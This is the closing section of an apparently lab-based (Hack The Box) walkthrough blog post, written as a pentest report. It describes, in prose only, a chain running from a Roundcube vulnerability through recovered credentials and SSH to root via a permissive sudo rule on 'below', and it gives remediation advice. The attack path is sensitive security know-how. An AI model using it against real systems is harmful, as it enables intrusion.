### 1. Critical Finding: Exposure of Service Account Credentials

**Risk Rating:** **CRITICAL**

**Description for Management:** The system was compromised due to a fundamental failure in **credential management**. Access to the Roundcube application was facilitated by a critical security vulnerability (CVE-2025–49113), but the subsequent system escalation relied on **passwords being stored in recoverable formats** within the application database. This exposes a severe risk stemming from weak configuration standards.

**Recommendation:**

- <span id="d39f">**Policy Enforcement:** Mandate the use of strong, salted hashing algorithms (like Argon2 or bcrypt) for all data stored in the database.</span>
- <span id="7068">Implement strict policies against storing cleartext or easily recoverable secrets, including those in session variables.</span>

### 2. High Finding: Overly Permissive `sudo` Policies

**Risk Rating:** **HIGH**

**Description for Management:** The employee account, **Jacob**, was granted **un necessary and excessive administrative permissions** to run the `below` resource monitoring utility as the root user. This misconfiguration directly violates the **Principle of Least Privilege** and enabled the attacker (CVE-2025-27591) to achieve full, unrestricted control of the entire server.

**Recommendation:**

- <span id="801c">**Control Audit:** Conduct a full, system-wide audit of all `sudo` and privileged escalation rules.</span>
- <span id="d1e9">**Revoke all unnecessary elevated permissions** and ensure employees are only permitted to execute the exact commands required for their job function.</span>

### 3. General Risk: Insecure Remote Access Credentials

**Risk Rating:** **MEDIUM**

**Description for Management:** The attacker gained **Secure Shell (SSH)** access to the system using credentials recovered via the initial compromise. This highlights a risk in general security hygiene where one successful breach (Roundcube) directly facilitates the use of a second service (SSH).

**Recommendation:**

- <span id="0f99">**Staff Training & MFA:** Enforce **Multi-Factor Authentication (MFA)** for all remote access (SSH, VPN) to prevent compromised credentials from enabling access.</span>
- <span id="a8a9">Implement regular training on password rotation and the consequences of weak credential management.</span>

### Conclusion & Next Steps

This assessment demonstrates that the system has **critical, chained vulnerabilities** that allow for full root-level compromise. All exposed credentials must be **rotated immediately**, and the **Roundcube application should be patched or taken offline** until the vulnerability is fixed.

Would be my pentest report findings! but i keep it as a walk-through/pentest report style writing! For any HR. dept reading these and would like to hire me!

> **Psalm 107:1** (CSB) Give thanks to the Lord, for he is good; his faithful love endures forever.

Thanks everyone who read this and for the support.. if you are new to cybersecurity welcome! its the best.. any questions about anything fell free to join my DiscordServer. I try to do labs together as a team and have everyone learn together! Please feel free to come and join in! God Bless everyone!

Discord=<a href="https://discord.gg/We99mDNE" class="markup--anchor markup--p-anchor" data-href="https://discord.gg/We99mDNE" rel="nofollow noopener" target="_blank">https://discord.gg/We99mDNE</a>

Linkedin=www.linkedin.com/in/nick-mullenski-9a5980367

HTB-CTF-Team=Kr0nos510

By <a href="https://medium.com/@nicholasmullenski" class="p-author h-card">Nicholas Mullenski</a> on [November 28, 2025](https://medium.com/p/227924e660b8).

<a href="https://medium.com/@nicholasmullenski/outbound-htb-machine-walk-through-227924e660b8" class="p-canonical">Canonical link</a>

Exported from [Medium](https://medium.com) on September 1, 2026.
